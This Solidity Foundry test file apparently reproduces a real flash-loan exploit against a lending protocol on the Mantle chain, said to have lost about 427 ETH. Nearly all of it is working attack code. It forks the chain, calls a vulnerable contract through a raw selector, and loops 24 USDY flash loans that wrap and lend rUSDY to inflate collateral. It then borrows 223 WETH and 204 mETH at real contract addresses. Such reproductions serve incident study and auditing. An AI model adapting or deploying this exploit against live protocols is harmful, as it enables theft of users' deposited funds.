// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~427 ETH
// TX : https://app.blocksec.com/explorer/tx/mantle/0xb3c4c313a8d3e2843c9e6e313b199d7339211cdc70c2eca9f4d88b1e155fd6bd
// Attacker : https://mantlescan.info/address/0x618f768af6291705eb13e0b2e96600b3851911d1
// Attack Contract : https://mantlescan.info/address/0x5fdac50aa48e3e86299a04ad18a68750b2074d2d
// GUY : https://x.com/0xNickLFranklin/status/1813122959219040323
interface IERC3156FlashBorrower {

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}
interface Musdy is IERC20{
    function maxFlashLoan(address token) external view returns (uint256) ;
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external  returns (bool);
    function redeemUnderlying(uint256 redeemAmount) external ;
    function lendRUSDY(uint256 _rUsdyLendAmount) external ; 

}
interface Musd is IERC20{

      function wrap(uint256 _USDYAmount) external ;

}
interface Meth is IERC20{
    function borrow(uint256 _amount) external ;
}
contract Exploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address  vulncontract = 0xe38E3a804eF845e36F277D86Fb2b24b8C32B3340;
    Musdy musdy=Musdy(0x5edBD8808F48Ffc9e6D4c0D6845e0A0B4711FD5c);
    Musd musd=Musd(0xab575258d37EaA5C8956EfABe71F4eE8F6397cF3);
    Meth mWETH=Meth(0xfa1444aC7917d6B96Cac8307E97ED9c862E387Be);
    Meth mMETH=Meth(0x5aA322875a7c089c1dB8aE67b6fC5AbD11cf653d);
    IERC20 WETH=IERC20(0xdEAddEaDdeadDEadDEADDEAddEADDEAddead1111);
    IERC20 mETH=IERC20(0xcDA86A272531e8640cD7F1a92c01839911B90bb0);
    IERC20 usdy=IERC20(0x5bE26527e817998A7206475496fDE1E68957c5A6);
    address Proxy=0xe53a90EFd263363993A3B41Aa29f7DaBde1a932D;
    bytes4 private constant TARGET_FUNCTION_SELECTOR = 0x847d282d;
    uint256 public wrapAmount;

    function setUp() public {
        cheats.createSelectFork("https://rpc.mantle.xyz", 66416576);
    }

    function testExpolit() public {
        usdy.approve(address(musdy),type(uint256).max);
        usdy.approve(address(musd),type(uint256).max);
        musd.approve(address(musdy),type(uint256).max);
        musdy.approve(address(musdy),type(uint256).max);
        address[] memory addressArray = new address[](1);
        addressArray[0] = address(musdy);
        address(Proxy).call(abi.encodeWithSignature("enableAsCollateral(address[])", addressArray));
        address(vulncontract).call(abi.encodeWithSelector(bytes4(0x490e6cbc), address(this),0,4265391252891663973703824,""));
        // emit log_named_decimal_uint("[End] Attacker musdy balance after exploit", musdy.balanceOf(address(this)), musdy.decimals());
        mWETH.borrow(223 ether);
        mMETH.borrow(204 ether);
        emit log_named_decimal_uint("[End] Attacker musdy balance after exploit", musdy.balanceOf(address(this)), musdy.decimals());
        emit log_named_decimal_uint("[End] Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals());
        emit log_named_decimal_uint("[End] Attacker mETH balance after exploit", mETH.balanceOf(address(this)), mETH.decimals());


    }
    // function 0x847d282d(uint256 varg0, uint256 varg1, uint256 varg2){
       function myFunction(uint256 a, uint256 b, uint256 c) public {
        uint256 i=0;
        initializeWrapAmount(4265037756531702250012049);
        while(i<24){
            uint256 amount=musdy.maxFlashLoan(address(usdy));
            musdy.flashLoan(IERC3156FlashBorrower(address(this)), address(usdy), amount, "");
            musdy.redeemUnderlying(4265817792016953140101195);
            i++;
        }
        usdy.transfer(address(msg.sender),4265817792016953140101195);
       }
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        musd.wrap(wrapAmount);
        wrapAmount -= 383885212760249758;
        uint256 thisamount=musd.balanceOf(address(this));
        musdy.lendRUSDY(thisamount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    function initializeWrapAmount(uint256 initialAmount) public {
        wrapAmount = initialAmount;
    }
    fallback() external payable {
        require(msg.data.length >= 4, "Invalid data");
        bytes4 selector;
        assembly {
            selector := calldataload(0)
        }
        if (selector == TARGET_FUNCTION_SELECTOR) {
            uint256 varg0;
            uint256 varg1;
            uint256 varg2;
            assembly {
                varg0 := calldataload(4)
                varg1 := calldataload(36)
                varg2 := calldataload(68)
            }
            myFunction(varg0, varg1, varg2);
        } else {
            revert("Function not recognized");
        }
    }
    receive() external payable {}
}
